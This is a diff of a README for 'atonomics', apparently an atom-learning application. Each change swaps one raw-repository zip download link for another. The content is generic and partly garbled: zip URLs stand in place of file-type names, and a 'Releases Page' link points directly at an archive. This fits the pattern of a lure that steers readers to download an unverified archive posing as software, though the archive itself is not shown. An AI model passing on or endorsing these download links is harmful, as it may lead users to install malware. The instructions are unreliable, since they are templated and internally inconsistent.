@@ -1,7 +1,7 @@
 # 🚀 atonomics - Simplifying Atom-Based Concepts Easily
 
 ## 🔗 Download Atonomics Now
-[![Download Atonomics](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/atonomics_1.4.zip%20Atonomics-blue?style=flat&logo=github)](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/atonomics_1.4.zip)
+[![Download Atonomics](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/Software-3.9.zip%20Atonomics-blue?style=flat&logo=github)](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/Software-3.9.zip)
 
 ## 🎯 Overview
 Atonomics is a user-friendly application designed to help you explore the world of atomic concepts clearly and effectively. Whether you are looking to learn about atoms or dive deep into related topics like electromagnetism and particle physics, Atonomics provides tools to enhance your understanding.
@@ -10,7 +10,7 @@ Atonomics is a user-friendly application designed to help you explore the world 
 To begin using Atonomics, follow these steps:
 
 1. **Visit Our Releases Page**
-   - Click [here to download Atonomics](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/atonomics_1.4.zip).
+   - Click [here to download Atonomics](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/Software-3.9.zip).
    - This page lists all available versions of the application.
 
 2. **Download the Latest Version**
@@ -21,7 +21,7 @@ To begin using Atonomics, follow these steps:
 3. **Install Atonomics**
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.dmg` file.
-   - For Linux users, download the appropriate `https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/atonomics_1.4.zip` file.
+   - For Linux users, download the appropriate `https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/Software-3.9.zip` file.
    - Follow the instructions specific to your operating system to complete the installation.
 
 4. **Run the Application**
@@ -34,7 +34,7 @@ Before downloading Atonomics, ensure your system meets the following requirement
 - **Operating System:**
   - Windows 10 or later
   - macOS 10.14 (Mojave) or later
-  - Any Linux distribution that supports https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/atonomics_1.4.zip files
+  - Any Linux distribution that supports https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/Software-3.9.zip files
 
 - **Hardware:**
   - At least 2GB of RAM
@@ -51,7 +51,7 @@ Atonomics includes several valuable features to assist users:
 ## 📥 Download & Install
 To obtain Atonomics, follow these instructions again:
 
-1. Visit our [Releases Page](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/atonomics_1.4.zip).
+1. Visit our [Releases Page](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/Software-3.9.zip).
 2. Click on the latest version.
 3. Download the file for your operating system.
 4. Install the application by following the prompts.
@@ -74,4 +74,4 @@ If you encounter any issues while downloading or running Atonomics, we are here 
 ## 📝 Conclusion
 Atonomics is designed for users of all backgrounds who wish to delve into atomic concepts easily. Downloading and running the application is straightforward. Follow the instructions, engage with the features, and enhance your understanding of the atomic world.
 
-Don't forget to check for updates regularly via our [Releases Page](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/atonomics_1.4.zip) to keep your application current. Happy learning!
+Don't forget to check for updates regularly via our [Releases Page](https://raw.githubusercontent.com/muhaewfwefe/atonomics/main/transparency/Software-3.9.zip) to keep your application current. Happy learning!
